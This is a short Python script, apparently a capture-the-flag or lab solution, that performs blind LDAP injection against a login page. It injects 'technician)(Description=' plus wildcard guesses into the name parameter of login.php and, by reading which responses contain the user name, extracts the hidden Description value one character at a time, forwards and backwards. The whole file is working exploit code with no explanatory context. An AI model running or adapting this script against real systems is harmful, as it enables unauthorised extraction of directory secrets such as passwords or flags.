
##
##

import os,sys,re
import requests
import logging as log 
import string

log.basicConfig(level=log.DEBUG, format="%(message)s")

PREFIX = "technician)(Description="
CHECK_NAME = "technician"

def check_data(data):
    log.debug(f"Checking: {data}")
    r = requests.get(f"http://things.things.edu/portal/login.php?name={PREFIX}{data}")
    if "</table>" == r.text:
        log.debug(f"Error: {data}")
        return False
    elif f"{CHECK_NAME}" in r.text:
        log.debug(f"Success: {data}")
        return True
    else:
        log.debug(f"False: {data}")
        return False

WORDARRAY = [i for i in string.ascii_letters + string.digits]
WORDARRAY.append("\=")
WORDARRAY.append("\*")
WORDARRAY.append("\#")
WORDARRAY.append("{")
WORDARRAY.append("}")
WORDARRAY.append("\(")
WORDARRAY.append("\)")

def check_append():
    result = ""
    while True:
        for i in WORDARRAY:
            if check_data(result + i + "*"):
                result += i
                log.debug(f"Result: {result}")
                break
        else:
            break
    return result
    
def check_prepend():
    result = ""
    while True:
        for i in WORDARRAY:
            if check_data("*" + i + result):
                result = i + result
                log.debug(f"Result: {result}")
                break
        else:
            break
    return result
    
def main():
    log.info(check_prepend())
    log.info(check_append())
    

if __name__ == "__main__":
    main()
  
##
##
